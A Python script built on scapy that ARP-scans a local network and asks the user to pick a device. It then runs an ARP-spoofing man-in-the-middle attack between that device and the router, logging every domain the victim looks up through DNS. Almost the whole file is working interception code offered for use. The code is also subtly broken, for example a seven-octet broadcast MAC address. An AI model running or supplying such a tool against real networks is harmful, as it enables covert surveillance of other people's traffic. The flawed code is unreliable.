import warnings
from scapy.all import arp_mitm, conf, sniff, DNS, ARP, srp, Ether
import threading
from time import strftime, localtime
from colorama import Fore, Style

warnings.filterwarnings("ignore")

class Device:
    def __init__(self, routerip, network, iface):
        self.routerip = routerip
        self.targetip = None
        self.iface = iface if iface else conf.iface  

    def mitm(self):
        while True:
            try:
                arp_mitm(self.routerip, self.targetip, iface=self.iface)
                print(f"ARP MITM started on {self.iface}")
            except OSError:
                print(f"IP seems down, retrying ...")
                continue

    def capture(self, packet):
        if packet.haslayer(DNS):
            self.dns(packet)

    def dns(self, pkt):
        if pkt.haslayer(DNS) and pkt[DNS].qd: 
            record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
            time = strftime("%m/%d/%y %H:%M:%S", localtime())
            print(f"[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]")
        else:
            print(f"[{Fore.RED}{strftime('%m/%d/%y %H:%M:%S', localtime())} | No DNS record found in packet{Style.RESET_ALL}]")

    def watch(self):
        t1 = threading.Thread(target=self.mitm)
        t1.start()

        t2 = threading.Thread(target=lambda: sniff(iface=self.iface, prn=self.capture, store=False))
        t2.start()
        t1.join()
        t2.join()

    def arp_scan(self, network, iface=None):
        iface = iface if iface else conf.iface

        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff:ff") / ARP(pdst=network), timeout=5, iface=iface)
        print(f'{Fore.RED}########## NETWORK ##########{Style.RESET_ALL}\n')
        for sent, received in ans:
            ip = received.psrc  
            print(f'{Fore.BLUE}{ip}{Style.RESET_ALL}')
        return input('\nPick a device IP:')            

